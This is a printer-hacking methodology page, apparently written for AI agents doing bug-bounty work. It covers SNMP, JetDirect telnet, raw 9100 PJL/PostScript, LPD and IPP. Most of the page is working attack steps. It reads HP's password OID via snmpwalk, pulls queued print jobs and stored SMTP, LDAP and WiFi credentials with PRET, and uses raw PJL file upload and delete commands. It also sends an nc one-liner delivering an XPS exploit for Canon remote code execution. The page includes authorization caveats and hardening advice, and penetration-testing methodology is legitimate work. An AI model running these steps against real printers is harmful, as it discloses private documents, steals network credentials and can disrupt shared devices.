---
technology: "JetDirect / raw network printing"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "field-grounded THIN (3 evidence files; see internal coverage ledger) + upstream-verified: RUB-NDS PRET README, HP-LASERJET-COMMON-MIB (gdPasswords OID), exploit-db 22319 / CVE-2002-1048, 2026-11-12"
provenance: "hybrid: corpus-grounded (4 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
ht-source:
  - "rewritten from HackTricks (src/network-services-pentesting/9100-pjl.md), CC BY-NC 4.0, accessed 2026-11-13"
  - "rewritten from HackTricks (src/network-services-pentesting/515-pentesting-line-printer-daemon-lpd.md), CC BY-NC 4.0, accessed 2026-11-13"
  - "rewritten from HackTricks (src/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp.md), CC BY-NC 4.0, accessed 2026-11-13"
---

Companion page: [[jetdirect|JetDirect overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# JetDirect / Raw Printing Bug Bounty Methodology

**Scope:** network printers speaking raw 9100/tcp (PCL/PJL/PostScript), the JetDirect-style telnet admin console (23/tcp), and printer SNMP (161/udp, HP enterprise MIB). **Out of scope:** CUPS servers and Windows print spooler ([[cups]]), generic SNMP infrastructure ([[snmp]]) — referenced where they intersect.

**Authorization:** presumes written permission. Printing devices are fragile and shared — DESTRUCTIVE flags mark steps that can jam or reset a production device; never send test pages to real output trays, and prefer read-only language operations (`ls`, `cat`, `info`, `get`) over writes (`put`, `rm`, job manipulation).

## Decision tree (one screen)

1. 161/udp + community `public` answers → Phase 1 (SNMP: config + password OID).
2. Telnet 23 requires the JetDirect password → Phase 1 supplies it → Phase 2 (console).
3. 9100/tcp open, no banner → Phase 3 (PRET language probe: ps → pjl → pcl).
4. Language connects → Phase 4 (device/file-system/queue enum) → Phase 5 (credentials) → Phase 6 (pivot).
5. No printer ports directly reachable but a print server fronts the device → cross-ref [[cups]] (observed: PJL payload inside a CUPS-rendered job).

## Phase 1 — SNMP: configuration and the password object

```bash
snmpwalk -v 2c -c public 198.51.100.10                     # general walk (observed)
snmpwalk -v 2c -c public 198.51.100.10 .1.3.6.1.4.1.11.2.3.9.1.1.13.0   # HP gdPasswords (telnet password)
```

Upstream facts: `.1.3.6.1.4.1.11.2.3.9.1.1.13` is `gdPasswords` in HP-LASERJET-COMMON-MIB ("Objects used in HP JetDirect Print Servers", OctetString, mandatory read-write); reading instance `.0` returns the password material — historically hex-encoded (CVE-2002-1048 / exploit-db 22319, `snmputil get ... public .1.3.6.1.4.1.11.2.3.9.1.1.13.0`). Field-verified: this exact OID walked to recover the telnet credential. Expect modern firmware to have moved this behind auth — a timeout/`no Such Object` is the answer on patched devices; the walk itself still maps the MIB.

Also harvest from the walk: device description strings (sysDescr like `Corp-Reception Printer` — one observed device's sysDescr was simply its lab name), contact/location strings (asset intel), network config hints.

## Phase 2 — Telnet console (23/tcp)

```bash
telnet 198.51.100.10        # "HP JetDirect" banner + password prompt (observed)
```

With the Phase-1 password: the console exposes TCP/IP config, access lists, and on older firmware reset/config operations. **DESTRUCTIVE:** do not factory-reset or change config on a live device; read, screenshot, exit.

## Phase 3 — Raw 9100: language probing with PRET

```bash
git clone https://github.com/RUB-NDS/PRET && cd PRET
./pret.py 198.51.100.10 ps    # PostScript first
./pret.py 198.51.100.10 pjl   # failed? try PJL (observed — ps fails, pjl connects)
./pret.py 198.51.100.10 pcl   # last
```

There is no banner or negotiation on 9100 — the language is chosen by what you send; a failed mode produces an error/no dialog, a correct one produces a device identity (observed: `pjl` connects and the device names itself `LaserCorp LaserJet 4ML`). Upstream: PRET wraps PostScript, PJL and PCL behind a UNIX-like shell; PostScript mode has the deepest language powers, PJL is the reliable file-system citizen on HP-family devices.

## Phase 4 — Device, file system, queue enumeration

```
PRET> info            # model, RAM/ROM, config incl. supported encryption (AES/CBC)
PRET> ls /            # device file system
PRET> find .          # recursive listing
PRET> jobs / ls jobs  # queued/stored jobs
PRET> get <job>       # pull a printed document (observed: a queued base64 blob)
PRET> cat <file>      # read config files to stdout
PRET> mirror .        # bulk-copy the tree (large — bound it)
```

Document disclosure is the flagship finding: queued jobs persist after printing. Observed: an AES-encrypted job retrieved, with the decryption path reconstructed from `info`'s encryption description. Classify the disclosure by content (printed documents, faxes, stored scans).

## Phase 5 — Credential harvesting

```
PRET> env / cat config files   # SMTP (scan-to-email), LDAP (address book bind), WiFi PSK
```

Stored network credentials are the pivot: SMTP logins, LDAP bind accounts (often a real domain service account), WiFi keys on network-config pages. Report each with the destination system it unlocks — that is the impact statement.

## Phase 6 — Pivot and adjacent chains

- **Scan-to-folder accounts** (SMB [[smb]], FTP [[ftp]] targets on the device) — same credential logic as Phase 5.
- **Job injection via print servers**: a CUPS host rendering for the device can be made to emit attacker-controlled PJL inside a legitimate job (observed: the FoomaticRIP `FoomaticRIPCommandLine` writes `@PJL` sequences into the rendered stream; the CUPS side belongs to [[cups]]).
- **Intranet position**: printers hold address books (email targets), logs (who printed what), and ARP tables — recon value even without credentials.

## Phase 6a — Raw PJL by hand: no PRET required (added 2026-11-13)

PRET wraps the language; the language itself is a line protocol over the
9100 socket — worth speaking directly when PRET's wrapper misbehaves or you
want surgical, read-only requests. Open `nc <printer> 9100` and issue PJL
commands (HP PJL Technical Reference shapes; vendor/model-dependent):

```text
@PJL INFO ID          -> brand + model + firmware (e.g. Brother HL-L2360D series ... Ver.b.26)
@PJL INFO STATUS      -> CODE=40000 DISPLAY="Sleep" ONLINE=TRUE
@PJL INFO PRODINFO    -> full product block
@PJL INFO VARIABLES   -> environment/config variables
@PJL INFO FILESYS     -> filesystem table
@PJL INFO TIMEOUT     -> timeout settings
@PJL RDYMSG           -> the ready-message line (also settable — display spoofing)
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535   -> directory listing
@PJL FSUPLOAD         -> read a filesystem object to the client
@PJL FSDOWNLOAD       -> write client data into the device filesystem
@PJL FSDELETE         -> delete a device file
```

Discipline: everything `FSINIT` and below is write/destructive territory —
`FSINIT` (filesystem initialization) can wipe device storage; never send it
during enumeration. Start with the `INFO` family and `FSDIRLIST`, and treat
`FSDELETE`/`FSDOWNLOAD` as authorized-action-only. Automation without the
full PRET shell: nmap's `pjl-ready-message` NSE, and the Metasploit
`printer_env_vars` / `printer_list_dir` / `printer_list_volumes` /
`printer_ready_message` / `printer_version_info` scanner set (plus
`printer_download_file` / `printer_upload_file` / `printer_delete_file` for
the authorized phases).

## Phase 6b — LPD (515/tcp): the queue protocol (added 2026-11-13)

RFC 1179's Line Printer Daemon protocol is the older job-submission surface
still open on many devices and Unix hosts: a **control file** describing the
job plus a **data file** of printable content, with queue inspection,
submission, and removal operations. The offensive property: the data file is
fed to whatever printer language the device speaks — a "print job" of
PostScript or PJL reaches the same interpreters as raw 9100, so language
primitives (filesystem, memory) are reachable through the queue protocol on
devices that expose them. Capabilities are model-specific; enumerate queue
names before sending anything and keep test jobs benign. A standard client
submits once you know a queue name (the Windows form):
`lpr -S 198.51.100.10 -P <queue> -o test.txt`; LPRng hosts serve the same
protocol with `lpr`/`lpq`/`lprm`.

PRET ships the LPD-specific tools: `lpdprint.py` (submit print data) and
`lpdtest.py` (implementation-specific behavior probes — file get/put/rm on
the device, command-injection and mail-relay tests in vulnerable stacks).
Several of its operations are destructive by design; authorized targets
only.

## Phase 6c — IPP on the device itself (631/tcp) (added 2026-11-13)

The Internet Printing Protocol (RFC 8010 encoding/transport, RFC 8011
model — the successors of RFC 2910/2911) is print jobs and queue management
carried over HTTP, TCP/631 (UDP/631 belongs to CUPS browsing — that side
lives in [[cups]]). Device-side IPP enumeration:

```bash
nmap -sV -p 631 --script cups-info,cups-queue-info 198.51.100.10   # model, state, queue stats, pending jobs
ipptool -tv ipp://198.51.100.10/ipp/print get-printer-attributes.test  # firmware, supported formats
ippfind --timeout 3 --txt -v "@local and port=631"                  # multicast discovery of IPP printers
```

`ipptool`/`ippfind` are the CUPS client utilities; the bundled
`get-printer-attributes.test` pulls firmware versions and supported
document formats in one request. Raw IPP is trivially craftable by hand —
the message is a version/operation/request-id header plus tagged
attribute-value pairs, POSTed with `Content-Type: application/ipp` — so a
minimal Python `struct` client reaches operations the tools do not expose.
Offensive checks on the device side:

- **Unauthenticated printing**: does `POST /ipp/print` accept a job with no
  authorization? (Whether that escalates to interpreter `system()`
  execution is firmware-specific — never claim it without proving it.)
- **Job hijacking**: missing-authorization checks on `Cancel-Job` /
  `Send-Document` let you disrupt or replace other users' jobs — the
  operation names alone bypass nothing.
- **SNMP→IPP combination**: a default SNMP `public` community often yields
  the queue names and printer URI the IPP tests need.
- **Parser memory-safety history** (verified advisories): **CVE-2023-50739**
  — Lexmark IPP buffer overflow, pre-auth RCE (CVSS 8.8, adjacent network),
  firmware `.230.209` and earlier → fixed `.230.210`+ across a very large
  model list (Lexmark advisory, ZDI-CAN-22549); **CVE-2023-0856**
  (ZDI-23-556) — Canon imageCLASS MF743Cdw stack overflow in the IPP `sides`
  attribute, pre-auth RCE, Pwn2Own entry by Team Viettel, vendor update
  shipped. Both make 631-on-a-printer a code-execution candidate, not just
  an information leak.

## Phase 6d — Canon ImageCLASS: XPS delivery, TrueType VM RCE (added 2026-11-13)

A 2024 Pwn2Own Canon ImageCLASS exploit chain (PHP HOOLIGANS, published by
haxx.in, 2025-09-23) turned `@PJL ENTER LANGUAGE` into code execution — a
template for any device whose PJL accepts job languages beyond PCL/PS:

1. **Delivery**: `@PJL ENTER LANGUAGE = XPS`, then the XPS document (a
   ZIP of XML parts) sent on the same 9100 connection:
   `{ printf "@PJL ENTER LANGUAGE = XPS\r\n"; cat exploit.xps; } | nc -q0 198.51.100.10 9100`
2. **The bug class**: an XPS page references a font (`FontUri`); TrueType
   *hinting bytecode* (`fpgm`/`prep`) executes in the printer's TrueType VM,
   and Canon's VM lacked stack bounds checks. The primitives stack up as an
   exploitation toolkit — out-of-bounds stack reads (info leak), an
   unchecked relative stack pivot, and the VM's write/read storage
   instructions staging a precise 32-bit write onto a function pointer for
   control-flow capture.
3. **Why it matters generally**: page-language interpreters on printers are
   scriptable VMs with filesystem access — new job languages (XPS here) are
   fresh, under-tested interpreter surfaces on the same old port.

## Phase 7 — Defense and validation notes

- **Password-OID finding:** the `snmpwalk` output line + successful telnet login = full chain in one report pair.
- **Document disclosure:** the PRET `get` of a queued job plus its (redacted) content.
- **Credential finding:** the config line showing the stored account, plus proof the account authenticates elsewhere — do not print stored passwords verbatim in the report.
- **Detection telemetry defenders should have (note and avoid):** raw-9100 sessions with non-print traffic, SNMP walks of the HP tree, telnet logins off-hours, PRET-style command strings in device logs (many devices log PJL errors).
- **Hardening for the report:** close 9100 to user VLANs (print-server relay only), disable telnet, change SNMP communities off `public` (SNMPv3 where supported), wipe stored jobs, remove or scope scan-to-email LDAP binds, treat the device as a credential holder in inventory.

## Appendix A — Tooling (named in prose)

- **PRET (RUB-NDS)** — the printer exploitation toolkit; `pret.py <target> ps|pjl|pcl` with UNIX-like commands (`info`, `ls`, `cat`, `get`, `env`, `mirror`); its wiki (Hacking Printers) documents per-language capabilities.
- **snmpwalk / snmpget** (net-snmp) — Phase 1; `-v 2c -c public` plus the HP OIDs.
- **telnet / nc** — console access and raw 9100 probing without tooling.
- **snmputil** — the Windows-native equivalent named in the 2002 disclosure (exploit-db 22319).
- **Metasploit** — scanner modules for printer identification exist, but PRET covers the surface more completely; use for the SNMP sweep when volume matters.
- References: PRET README (upstream-verified for this page), HP-LASERJET-COMMON-MIB object listing, exploit-db 22319 / CVE-2002-1048.

## Appendix B — Quick reference

```bash
# SNMP config + password object
snmpwalk -v 2c -c public 198.51.100.10 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
# telnet console
telnet 198.51.100.10
# raw 9100 language probe
./pret.py 198.51.100.10 ps ; ./pret.py 198.51.100.10 pjl ; ./pret.py 198.51.100.10 pcl
# inside PRET
info ; ls / ; jobs ; get <job> ; env ; cat <conffile>
```
